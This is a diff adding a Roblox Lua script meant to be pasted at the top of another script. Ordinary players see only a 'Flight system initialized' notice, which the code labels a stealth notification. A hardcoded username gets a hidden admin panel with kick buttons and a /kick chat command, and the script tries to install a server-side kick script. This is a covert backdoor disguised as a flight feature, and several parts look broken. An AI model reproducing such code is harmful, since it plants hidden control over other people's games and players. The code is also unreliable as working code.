@@ -1,6 +1,279 @@
 
 
+-- Paste this at the TOP of your script
+wait(1) -- Initialization delay
 
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+
+-- Your EXACT Roblox username
+local ADMIN_NAME = "Shshshheshehv"
+
+-- Track all users who executed this script
+local scriptUsers = {}
+table.insert(scriptUsers, player.Name)
+
+-- 1. STEALTH NOTIFICATION FOR NORMAL PLAYERS
+if player.Name ~= ADMIN_NAME then
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "StealthNotify"
+    gui.Parent = player.PlayerGui
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 200, 0, 40)
+    frame.Position = UDim2.new(1, -210, 1, -50)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BackgroundTransparency = 0.5
+    frame.Parent = gui
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -10, 1, -10)
+    label.Position = UDim2.new(0, 5, 0, 5)
+    label.Text = "✈️ Flight system initialized"
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.SourceSans
+    label.TextSize = 14
+    label.Parent = frame
+    
+    -- Fade out animation
+    task.delay(3, function()
+        local tween = TweenService:Create(
+            frame,
+            TweenInfo.new(1),
+            {Position = UDim2.new(1, -210, 1, -30), BackgroundTransparency = 1}
+        )
+        tween:Play()
+        tween.Completed:Wait()
+        gui:Destroy()
+    end)
+end
+
+-- 2. STYLISH ADMIN PANEL (only for you)
+if player.Name == ADMIN_NAME then
+    -- Create main GUI
+    local adminGUI = Instance.new("ScreenGui")
+    adminGUI.Name = "AdminPanel"
+    adminGUI.Parent = player.PlayerGui
+    
+    -- Control button (top 50% toggle)
+    local toggleButton = Instance.new("TextButton")
+    toggleButton.Name = "Toggle"
+    toggleButton.Size = UDim2.new(0, 120, 0, 30)
+    toggleButton.Position = UDim2.new(0.5, -60, 0.5, 0)
+    toggleButton.Text = "🔼 ADMIN CONTROLS"
+    toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    toggleButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    toggleButton.Font = Enum.Font.SourceSansBold
+    toggleButton.TextSize = 14
+    toggleButton.ZIndex = 2
+    toggleButton.Parent = adminGUI
+    
+    -- Main panel (initially hidden)
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "Main"
+    mainFrame.Size = UDim2.new(0, 350, 0, 250)
+    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    mainFrame.ClipsDescendants = true
+    mainFrame.Visible = false
+    mainFrame.Parent = adminGUI
+    
+    -- Stylish title bar
+    local titleBar = Instance.new("Frame")
+    titleBar.Size = UDim2.new(1, 0, 0, 30)
+    titleBar.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
+    titleBar.Parent = mainFrame
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 1, 0)
+    title.Text = "👑 KURD HUB ADMIN PANEL"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.SourceSansBold
+    title.TextSize = 16
+    title.Parent = titleBar
+    
+    -- User list
+    local userList = Instance.new("ScrollingFrame")
+    userList.Size = UDim2.new(1, -10, 0, 150)
+    userList.Position = UDim2.new(0, 5, 0, 35)
+    userList.BackgroundTransparency = 1
+    userList.ScrollBarThickness = 5
+    userList.Parent = mainFrame
+    
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.Parent = userList
+    
+    -- Kick controls
+    local kickBox = Instance.new("TextBox")
+    kickBox.Size = UDim2.new(1, -10, 0, 30)
+    kickBox.Position = UDim2.new(0, 5, 0, 190)
+    kickBox.PlaceholderText = "Enter username to kick"
+    kickBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    kickBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    kickBox.Font = Enum.Font.SourceSans
+    kickBox.TextSize = 16
+    kickBox.Parent = mainFrame
+    
+    local kickButton = Instance.new("TextButton")
+    kickButton.Size = UDim2.new(1, -10, 0, 30)
+    kickButton.Position = UDim2.new(0, 5, 0, 225)
+    kickButton.Text = "🚫 KICK PLAYER"
+    kickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    kickButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    kickButton.Font = Enum.Font.SourceSansBold
+    kickButton.TextSize = 16
+    kickButton.Parent = mainFrame
+    
+    -- Create kick system
+    local kickRemote = Instance.new("RemoteEvent")
+    kickRemote.Name = "KurdHubKickSystem_"..tostring(os.time())
+    kickRemote.Parent = ReplicatedStorage
+    
+    -- Toggle visibility
+    local panelVisible = false
+    local function togglePanel()
+        panelVisible = not panelVisible
+        mainFrame.Visible = panelVisible
+        
+        if panelVisible then
+            toggleButton.Text = "🔽 HIDE CONTROLS"
+            mainFrame:TweenPosition(
+                UDim2.new(0.5, -175, 0.5, -125),
+                Enum.EasingDirection.Out,
+                Enum.EasingStyle.Quad,
+                0.3,
+                true
+            )
+        else
+            toggleButton.Text = "🔼 ADMIN CONTROLS"
+            mainFrame:TweenPosition(
+                UDim2.new(0.5, -175, 0.5, -400),
+                Enum.EasingDirection.In,
+                Enum.EasingStyle.Quad,
+                0.3,
+                true
+            )
+        end
+    end
+    
+    toggleButton.MouseButton1Click:Connect(togglePanel)
+    
+    -- Update user list
+    local function updateUserList()
+        userList:ClearAllChildren()
+        
+        for _, userName in pairs(scriptUsers) do
+            local userFrame = Instance.new("Frame")
+            userFrame.Size = UDim2.new(1, 0, 0, 30)
+            userFrame.BackgroundTransparency = 1
+            
+            local nameLabel = Instance.new("TextLabel")
+            nameLabel.Size = UDim2.new(0.7, 0, 1, 0)
+            nameLabel.Text = "• "..userName
+            nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            nameLabel.BackgroundTransparency = 1
+            nameLabel.Font = Enum.Font.SourceSans
+            nameLabel.TextSize = 16
+            nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+            nameLabel.Parent = userFrame
+            
+            local kickBtn = Instance.new("TextButton")
+            kickBtn.Size = UDim2.new(0.25, 0, 0.8, 0)
+            kickBtn.Position = UDim2.new(0.75, 0, 0.1, 0)
+            kickBtn.Text = "Kick"
+            kickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            kickBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+            kickBtn.Font = Enum.Font.SourceSansBold
+            kickBtn.TextSize = 14
+            kickBtn.Parent = userFrame
+            
+            kickBtn.MouseButton1Click:Connect(function()
+                kickRemote:FireServer(userName)
+                Players:FindFirstChild(userName):Kick("🔇 Kicked by admin")
+            end)
+            
+            userFrame.Parent = userList
+        end
+    end
+    
+    -- Kick functionality
+    local function kickPlayer(targetName)
+        local target = Players:FindFirstChild(targetName)
+        if target then
+            kickRemote:FireServer(targetName)
+            target:Kick("🔇 Kicked by admin")
+            return true
+        end
+        return false
+    end
+    
+    kickButton.MouseButton1Click:Connect(function()
+        local targetName = kickBox.Text
+        if kickPlayer(targetName) then
+            kickBox.Text = ""
+            local original = kickButton.Text
+            kickButton.Text = "✅ KICKED!"
+            task.wait(1.5)
+            kickButton.Text = original
+        else
+            local original = kickButton.Text
+            kickButton.Text = "❌ NOT FOUND!"
+            task.wait(1.5)
+            kickButton.Text = original
+        end
+    end)
+    
+    -- Chat command handler
+    player.Chatted:Connect(function(msg)
+        msg = string.lower(string.gsub(msg, "%s+", " "))
+        if string.sub(msg, 1, 5) == "/kick" then
+            local targetName = string.match(msg, "^/kick%s+(%S+)")
+            if targetName then
+                kickPlayer(targetName)
+            end
+        end
+    end)
+    
+    -- Server-side kick (auto-installs)
+    local serverScript = [[
+        local Players = game:GetService("Players")
+        local kickRemote = game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent")
+        
+        kickRemote.OnServerEvent:Connect(function(admin, targetName)
+            local target = Players:FindFirstChild(targetName)
+            if target then
+                target:Kick("🔇 Kicked by admin")
+            end
+        end)
+    ]]
+    
+    if not game:GetService("RunService"):IsServer() then
+        local script = Instance.new("Script")
+        script.Name = "KurdHubKickSystem"
+        script.Source = serverScript
+        script.Parent = game:GetService("ServerScriptService")
+    end
+    
+    -- Initial update
+    updateUserList()
+    
+    -- Auto-update every 5 seconds
+    while true do
+        task.wait(5)
+        updateUserList()
+    end
+end
+
+-- Track new players using this script
+Players.PlayerAdded:Connect(function(newPlayer)
+    newPlayer.CharacterAdded:Connect(function()
+        table.insert(scriptUsers, newPlayer.Name)
+    end)
+end)
 
 
 
